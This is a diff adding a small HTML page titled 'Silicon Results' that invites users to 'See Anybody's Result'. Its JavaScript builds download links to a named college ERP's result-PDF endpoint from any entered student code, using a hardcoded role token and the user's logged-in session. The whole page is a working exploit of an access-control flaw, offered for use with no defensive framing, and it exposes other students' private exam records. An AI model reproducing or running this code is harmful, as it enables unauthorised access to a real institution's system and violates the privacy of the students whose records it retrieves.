@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Silicon Results</title>
+  <link rel="stylesheet" href="index.css">
+</head>
+<body>
+  <div class="container">
+    <h2> See Anybody's Result:</h2>
+    <h3>First log into ERP and in another tab (this is a must step).</h3>
+    <center>
+  <input type="text" id="codePart" placeholder="Enter your SIC in upper case" />
+  <button onclick="generateLink()">Download</button>
+    </center>
+</div>
+
+  <script>
+    function generateLink() {
+      const codePart = document.getElementById("codePart").value.trim();
+      if (!codePart) {
+        alert("Please enter the code after SITBBS");
+        return;
+      }
+
+      const fullCode = "SITBBS" + codePart;
+      const url = `https://erp.silicon.ac.in/estcampus/autonomous_exam/final_semester_result_pdf_download.php?role_code=M1Z5SEVJM2dub0NWWE5GZy82dHh2QT09&student_code=${encodeURIComponent(fullCode)}&semester=undefined`;
+
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = "";
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    }
+  </script> 
+</body>
+</html>
+
